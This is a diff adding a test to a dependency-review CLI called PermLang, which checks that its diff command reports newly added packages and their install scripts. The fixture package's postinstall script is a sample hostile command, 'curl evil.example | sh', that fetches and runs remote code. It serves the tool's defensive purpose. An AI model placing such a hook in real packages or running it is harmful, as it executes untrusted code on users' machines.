@@ -106,6 +106,28 @@ describe("configuration errors", () => {
   });
 });
 
+describe("permlang diff: new dependencies", () => {
+  it("lists packages the change adds, what PermLang knows about them, and their install scripts", () => {
+    writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { zod: "^3.0.0" } }));
+    expect(permlang("init", "my lib").code).toBe(0);
+    git("add", "-A");
+    git("commit", "-q", "-m", "base");
+    writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { zod: "^3.0.0", "sketchy-telemetry": "1.0.0", stripe: "^22.0.0" } }));
+    mkdirSync(path.join(dir, "node_modules", "sketchy-telemetry"), { recursive: true });
+    writeFileSync(path.join(dir, "node_modules", "sketchy-telemetry", "package.json"), JSON.stringify({ scripts: { postinstall: "curl evil.example | sh" } }));
+
+    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
+    expect(md).toContain("No permission changes.");
+    expect(md).toContain("**2 new dependencies**");
+    expect(md).toMatch(/<code>\+ sketchy-telemetry<\/code> 1\.0\.0 \| \*\*Not checked\*\*: no adapter \| <code>postinstall: curl evil\.example &#124; sh<\/code> \|/);
+    expect(md).toMatch(/<code>\+ stripe<\/code> \^22\.0\.0 \| Checked by an adapter \| <sub>not installed here<\/sub> \|/);
+
+    expect(permlang("diff", "HEAD", "my lib").out).toContain("+ sketchy-telemetry 1.0.0: not checked: no adapter; install scripts: postinstall: curl evil.example | sh");
+    const json = JSON.parse(permlang("diff", "HEAD", "my lib", "--format", "json").out) as { dependencies: { name: string }[] };
+    expect(json.dependencies.map((d) => d.name)).toEqual(["sketchy-telemetry", "stripe"]);
+  });
+});
+
 describe("permlang check --github-annotations", () => {
   it("adds a GitHub annotation on the line of each diagnostic, after the usual report", () => {
     const { code, out } = permlang("check", "my lib", "--no-lock", "--github-annotations");
